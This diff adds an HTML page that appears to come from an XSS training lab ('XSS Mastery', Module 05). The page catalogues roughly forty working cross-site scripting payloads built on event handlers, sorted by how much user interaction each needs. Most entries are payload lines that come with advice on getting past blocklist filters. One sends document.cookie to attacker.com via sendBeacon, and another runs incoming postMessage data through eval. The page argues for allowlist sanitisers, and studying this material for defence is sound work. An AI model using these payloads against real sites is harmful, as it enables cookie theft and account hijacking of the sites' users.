@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Event Handler Catalog — Module 05 | XSS Mastery</title>
+  <style>
+    :root{--bg:#0b0f1a;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;
+          --cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;--green:#4ade80;
+          --orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;
+         padding:24px;max-width:1100px;margin:0 auto}
+    h1{font-size:24px;color:var(--gold);margin-bottom:6px}
+    h2{font-size:16px;color:var(--cyan);margin:28px 0 10px;
+       border-top:1px solid var(--border);padding-top:10px}
+    p{color:var(--muted);font-size:13px;line-height:1.6;margin-bottom:10px}
+    a{color:var(--cyan)}
+    code{font-family:'Courier New',monospace;font-size:11.5px;background:var(--code-bg);
+         color:var(--cyan);padding:2px 5px;border-radius:3px;border:1px solid var(--border)}
+    .legend{display:flex;gap:12px;flex-wrap:wrap;margin:14px 0}
+    .legend-item{display:flex;align-items:center;gap:5px;font-size:12px;color:var(--muted)}
+    .dot{width:9px;height:9px;border-radius:50%}
+    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:10px;margin-top:6px}
+    .entry{background:var(--card);border:1px solid var(--border);border-radius:6px;
+           padding:12px 14px;font-size:12.5px}
+    .entry-top{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+    .event-name{font-family:'Courier New',monospace;font-weight:700;font-size:13px;
+                color:var(--green)}
+    .interaction-badge{font-size:9px;font-weight:700;padding:2px 6px;border-radius:10px;
+                       text-transform:uppercase;letter-spacing:.07em}
+    .zero{background:#1a2f10;color:var(--green)}
+    .one-click{background:#2f1f10;color:var(--orange)}
+    .hover{background:#102030;color:var(--cyan)}
+    .legacy{background:#2a2a2a;color:#999}
+    .element-tag{font-family:'Courier New',monospace;font-size:10.5px;
+                 color:var(--muted);background:var(--code-bg);padding:1px 5px;
+                 border-radius:3px;margin-bottom:5px;display:inline-block}
+    .payload-line{font-family:'Courier New',monospace;font-size:11px;
+                  color:var(--orange);background:var(--code-bg);padding:5px 8px;
+                  border-radius:3px;word-break:break-all;margin:4px 0}
+    .note{font-size:11.5px;color:var(--muted);line-height:1.5}
+    .search-bar{display:flex;gap:8px;margin:14px 0}
+    .search-bar input{flex:1;background:var(--code-bg);color:var(--text);
+                      border:1px solid var(--border);border-radius:4px;
+                      padding:8px 12px;font-size:13px}
+    .count{font-size:12px;color:var(--muted);margin-bottom:10px}
+  </style>
+</head>
+<body>
+
+  <p style="margin-bottom:14px"><a href="/">← Lab Home</a> · <a href="/attack_02_events.html">← Attack 02 Demo</a></p>
+  <h1>Event Handler XSS Catalog</h1>
+  <p>
+    Every entry below is a real, working XSS vector. The event name is the key —
+    filters that blocklist specific names are broken by definition because this
+    list is not exhaustive. The correct defence is a sanitiser that <em>allowlists</em>
+    permitted attributes, not one that blocklists dangerous ones.
+    Open DevTools Console (F12) before using the test links.
+  </p>
+
+  <div class="legend">
+    <div class="legend-item"><div class="dot" style="background:#4ade80"></div>Zero interaction</div>
+    <div class="legend-item"><div class="dot" style="background:#fb923c"></div>Requires click/submit</div>
+    <div class="legend-item"><div class="dot" style="background:#38bdf8"></div>Requires hover</div>
+    <div class="legend-item"><div class="dot" style="background:#999"></div>Legacy browser only</div>
+  </div>
+
+  <div class="search-bar">
+    <input type="text" id="search" placeholder="Filter events… e.g. focus, load, mouse" oninput="filterEntries()">
+  </div>
+  <p class="count" id="count"></p>
+
+  <div id="catalog"></div>
+
+  <script>
+  const events = [
+    // ── ZERO INTERACTION (fire without user action) ──────────────────────────
+    {
+      event: "onerror", interaction: "zero",
+      elements: ["img","video","audio","input[type=image]","object","link","script"],
+      payload: '<img src=x onerror=alert(document.domain)>',
+      note: "src=x deliberately fails. Browser fires onerror synchronously. The single most reliable zero-interaction event handler for XSS. Works even via innerHTML."
+    },
+    {
+      event: "onload", interaction: "zero",
+      elements: ["svg","body","iframe","img (valid src)"],
+      payload: '<svg onload=alert(document.domain)>',
+      note: "SVG onload fires immediately when the SVG element is parsed. body onload fires when the page finishes loading. iframe onload fires when the frame loads."
+    },
+    {
+      event: "ontoggle", interaction: "zero",
+      elements: ["details"],
+      payload: '<details open ontoggle=alert(document.domain)>',
+      note: "The 'open' attribute causes an immediate toggle event at parse time — no click needed. Extremely reliable. Often missed by filters that check for onerror/onload only."
+    },
+    {
+      event: "onfocus", interaction: "zero",
+      elements: ["input","select","textarea","any[tabindex]"],
+      payload: '<input autofocus onfocus=alert(document.domain)>',
+      note: "autofocus causes the browser to focus the element immediately on page load, firing onfocus. Zero interaction. Works on any focusable element."
+    },
+    {
+      event: "onanimationstart", interaction: "zero",
+      elements: ["any (via CSS animation)"],
+      payload: '<style>@keyframes x{}</style><div style="animation:x" onanimationstart=alert(document.domain)>',
+      note: "Requires a CSS animation to be applied. The animation fires immediately if the keyframe runs. Can be combined with an inline style to avoid a separate stylesheet."
+    },
+    {
+      event: "onanimationend", interaction: "zero",
+      elements: ["any (via CSS animation)"],
+      payload: '<style>@keyframes x{from{color:red}to{color:blue}}</style><div style="animation:x 0.001s" onanimationend=alert(1)>',
+      note: "Same setup as onanimationstart. Set animation duration to near-zero so it fires immediately."
+    },
+    {
+      event: "onpointerrawupdate", interaction: "zero",
+      elements: ["any"],
+      payload: '<div onpointerrawupdate=alert(1)>move pointer here</div>',
+      note: "Fires on every raw pointer update — even cursor movement over the element. Highly obscure; most filters that block 'onpointer' miss the rawupdate variant."
+    },
+    {
+      event: "onscrollend", interaction: "zero",
+      elements: ["any scrollable"],
+      payload: '<div style="overflow:auto;height:1px" onscrollend=alert(1)><div style="height:100px">scroll</div></div>',
+      note: "Fires when a scroll operation completes. Can be triggered by programmatic scroll in some contexts. Relatively new event, often not in blocklists."
+    },
+    {
+      event: "onbeforetoggle", interaction: "zero",
+      elements: ["details","[popover]"],
+      payload: '<details open onbeforetoggle=alert(1)>',
+      note: "Fires just before the toggle happens. Newer event (2023+). Useful when ontoggle is specifically blocked."
+    },
+
+    // ── HOVER (fires on mouse movement over element) ─────────────────────────
+    {
+      event: "onmouseover", interaction: "hover",
+      elements: ["any visible element"],
+      payload: '<div onmouseover=alert(document.domain)>hover me</div>',
+      note: "Fires when the pointer enters the element. In phishing pages or injected banners, the attacker controls layout and can make this hard to avoid."
+    },
+    {
+      event: "onmouseenter", interaction: "hover",
+      elements: ["any visible element"],
+      payload: '<p onmouseenter=alert(1)>hover</p>',
+      note: "Like onmouseover but does not bubble. Useful when event bubbling is being blocked or monitored."
+    },
+    {
+      event: "onpointerover", interaction: "hover",
+      elements: ["any"],
+      payload: '<b onpointerover=alert(1)>hover</b>',
+      note: "Pointer events fire for mouse, touch, and stylus. Useful alternative when onmouseover is blocked."
+    },
+    {
+      event: "onmousemove", interaction: "hover",
+      elements: ["any visible element"],
+      payload: '<span onmousemove=alert(1) style="padding:20px;display:block">move mouse here</span>',
+      note: "Fires continuously as the mouse moves over the element. Triggers extremely readily."
+    },
+
+    // ── CLICK / INTERACTION ──────────────────────────────────────────────────
+    {
+      event: "onclick", interaction: "one-click",
+      elements: ["any"],
+      payload: '<div onclick=alert(document.domain) style="cursor:pointer;padding:10px">click me</div>',
+      note: "The most basic click handler. Requires user interaction, but in a crafted page the attacker can label any element as a button."
+    },
+    {
+      event: "ondblclick", interaction: "one-click",
+      elements: ["any"],
+      payload: '<p ondblclick=alert(1)>double-click</p>',
+      note: "Alternative to onclick. Useful when onclick is specifically blocked."
+    },
+    {
+      event: "onmousedown", interaction: "one-click",
+      elements: ["any"],
+      payload: '<div onmousedown=alert(1)>click and hold</div>',
+      note: "Fires on mouse button press, before release. Fires even if the user doesn't release over the element."
+    },
+    {
+      event: "onkeydown", interaction: "one-click",
+      elements: ["input","textarea","[contenteditable]"],
+      payload: '<input onkeydown=alert(1) placeholder="type anything">',
+      note: "Fires on any key press. Requires the element to be focused and the user to type."
+    },
+    {
+      event: "onkeypress", interaction: "one-click",
+      elements: ["input","textarea"],
+      payload: '<input onkeypress=alert(1) placeholder="type a character">',
+      note: "Deprecated but still fires in all major browsers. Alternative to onkeydown."
+    },
+    {
+      event: "onchange", interaction: "one-click",
+      elements: ["input","select","textarea"],
+      payload: '<select onchange=alert(1)><option>a</option><option>b</option></select>',
+      note: "Fires when the user changes the value of a form element and moves focus away."
+    },
+    {
+      event: "onsubmit", interaction: "one-click",
+      elements: ["form"],
+      payload: '<form onsubmit=alert(1)><input type=submit value="submit"></form>',
+      note: "Fires when the form is submitted. The default submission can be prevented with return false."
+    },
+    {
+      event: "formaction", interaction: "one-click",
+      elements: ["button","input[type=submit]","input[type=image]"],
+      payload: '<form><button formaction=javascript:alert(1)>submit</button></form>',
+      note: "formaction is an attribute, not an event handler — but it achieves execution on form submit. Often missed by event-handler filters because it is not an 'on*' attribute."
+    },
+    {
+      event: "oncontextmenu", interaction: "one-click",
+      elements: ["any"],
+      payload: '<div oncontextmenu=alert(1) style="padding:20px">right-click me</div>',
+      note: "Fires on right-click. Useful in social engineering scenarios where right-click is prompted."
+    },
+
+    // ── CLIPBOARD / DRAG ─────────────────────────────────────────────────────
+    {
+      event: "onpaste", interaction: "one-click",
+      elements: ["input","textarea","[contenteditable]"],
+      payload: '<textarea onpaste=alert(1) placeholder="paste something here"></textarea>',
+      note: "Fires when the user pastes into the element. Extremely common user action — any paste operation on the page triggers this."
+    },
+    {
+      event: "oncopy", interaction: "one-click",
+      elements: ["any (with selection)"],
+      payload: '<p oncopy=alert(1)>select and copy this text</p>',
+      note: "Fires when the user copies selected text. Useful in pages that encourage copying (share links, code snippets)."
+    },
+    {
+      event: "oncut", interaction: "one-click",
+      elements: ["input","textarea"],
+      payload: '<input value="cut me" oncut=alert(1)>',
+      note: "Fires when the user cuts text from an input. Less common but still triggers."
+    },
+    {
+      event: "ondrop", interaction: "one-click",
+      elements: ["any[ondragover]"],
+      payload: '<div ondragover="event.preventDefault()" ondrop=alert(1) style="padding:30px;border:1px dashed #38bdf8">drop here</div>',
+      note: "Fires when a dragged item is dropped. Requires ondragover with preventDefault to enable drop."
+    },
+
+    // ── WINDOW / DOCUMENT ────────────────────────────────────────────────────
+    {
+      event: "onhashchange", interaction: "zero",
+      elements: ["body","window"],
+      payload: '<body onhashchange=alert(1)><a href=#x>change hash</a></body>',
+      note: "Fires when the URL fragment changes. Can be triggered by a link click on the page, or by the attacker crafting the URL with a fragment."
+    },
+    {
+      event: "onpopstate", interaction: "one-click",
+      elements: ["body","window"],
+      payload: '<body onpopstate=alert(1)>',
+      note: "Fires when the browser navigates through history (back/forward). Requires a history entry to exist."
+    },
+    {
+      event: "onbeforeunload", interaction: "one-click",
+      elements: ["body","window"],
+      payload: '<body onbeforeunload=alert(1)>',
+      note: "Fires when the user attempts to leave the page. In modern browsers the dialog is suppressed but the handler still runs."
+    },
+    {
+      event: "onunload", interaction: "one-click",
+      elements: ["body"],
+      payload: '<body onunload=navigator.sendBeacon("//attacker.com",document.cookie)>',
+      note: "Fires when the page unloads. alert() is suppressed in unload handlers but sendBeacon() works — useful for exfiltration on page exit."
+    },
+    {
+      event: "onmessage", interaction: "zero",
+      elements: ["body","window"],
+      payload: '<body onmessage=eval(event.data)><!-- attacker posts message from another window -->',
+      note: "Fires when a postMessage is received. If combined with eval(), any window that can reach this page can execute arbitrary code. No origin check = critical DOM XSS."
+    },
+    {
+      event: "onstorage", interaction: "zero",
+      elements: ["body","window"],
+      payload: '<body onstorage=alert(event.newValue)>',
+      note: "Fires when localStorage or sessionStorage changes in another tab of the same origin. An attacker with XSS on one page can trigger onstorage on another."
+    },
+
+    // ── MEDIA ────────────────────────────────────────────────────────────────
+    {
+      event: "oncanplay", interaction: "zero",
+      elements: ["video","audio"],
+      payload: '<video oncanplay=alert(1) src=//localhost:5000/ping>',
+      note: "Fires when the browser can start playing the media. If src resolves (even partially), this fires. Can be triggered without user play action."
+    },
+    {
+      event: "onplay", interaction: "one-click",
+      elements: ["video","audio"],
+      payload: '<video controls onplay=alert(1)><source src=x></video>',
+      note: "Fires when the user starts playback. Requires user to click play. Often present in media-rich applications."
+    },
+    {
+      event: "ontimeupdate", interaction: "one-click",
+      elements: ["video","audio"],
+      payload: '<video controls ontimeupdate=alert(1) src=//localhost:5000/ping>',
+      note: "Fires periodically during playback. Once the user plays, fires repeatedly — useful for persistent execution during a session."
+    },
+
+    // ── LEGACY / IE-SPECIFIC ─────────────────────────────────────────────────
+    {
+      event: "onpropertychange", interaction: "legacy",
+      elements: ["any (IE only)"],
+      payload: '<input onpropertychange=alert(1) value=x>',
+      note: "IE-specific event. Fires when any property of the element changes. Included for historical completeness and legacy enterprise application audits."
+    },
+    {
+      event: "ondataavailable", interaction: "legacy",
+      elements: ["any (IE only)"],
+      payload: '<xml ondataavailable=alert(1) src=x>',
+      note: "IE-specific XML event. Fires when XML data becomes available. Historical interest only."
+    },
+    {
+      event: "onstop", interaction: "legacy",
+      elements: ["body (IE only)"],
+      payload: '<body onstop=alert(1)>',
+      note: "IE-specific. Fires when page loading is stopped. Historical interest only."
+    }
+  ];
+
+  function buildCatalog(items) {
+    const byInteraction = {zero:[], hover:[], "one-click":[], legacy:[]};
+    for (const e of items) (byInteraction[e.interaction] || byInteraction["one-click"]).push(e);
+
+    const sections = [
+      {key:"zero",    title:"Zero-Interaction Events (fire without user action)", color:"#4ade80"},
+      {key:"hover",   title:"Hover Events",                                        color:"#38bdf8"},
+      {key:"one-click",title:"Click / Interaction Events",                         color:"#fb923c"},
+      {key:"legacy",  title:"Legacy / IE-Specific Events",                         color:"#888"},
+    ];
+
+    let html = "";
+    for (const sec of sections) {
+      const entries = byInteraction[sec.key];
+      if (!entries.length) continue;
+      html += `<h2 style="color:${sec.color}">${sec.title}</h2>`;
+      html += `<div class="grid">`;
+      for (const e of entries) {
+        const badgeClass = e.interaction === "zero" ? "zero" :
+                           e.interaction === "hover" ? "hover" :
+                           e.interaction === "legacy" ? "legacy" : "one-click";
+        const badgeLabel = e.interaction === "zero" ? "zero interaction" :
+                           e.interaction === "hover" ? "hover" :
+                           e.interaction === "legacy" ? "legacy only" : "requires click";
+        const elHtml = e.elements.map(el => `<span class="element-tag">${el}</span>`).join(" ");
+        html += `<div class="entry" data-event="${e.event}" data-note="${e.note.toLowerCase()}">
+          <div class="entry-top">
+            <span class="event-name">${e.event}</span>
+            <span class="interaction-badge ${badgeClass}">${badgeLabel}</span>
+          </div>
+          <div style="margin-bottom:6px">${elHtml}</div>
+          <div class="payload-line">${e.payload.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+          <div class="note">${e.note}</div>
+        </div>`;
+      }
+      html += `</div>`;
+    }
+    return html;
+  }
+
+  function filterEntries() {
+    const q = document.getElementById("search").value.toLowerCase();
+    const all = events.filter(e =>
+      !q || e.event.includes(q) || e.note.toLowerCase().includes(q) ||
+      e.elements.some(el => el.includes(q)) || e.payload.toLowerCase().includes(q)
+    );
+    document.getElementById("catalog").innerHTML = buildCatalog(all);
+    document.getElementById("count").textContent =
+      `Showing ${all.length} of ${events.length} event vectors`;
+  }
+
+  // Initial render
+  filterEntries();
+  </script>
+
+</body>
+</html>
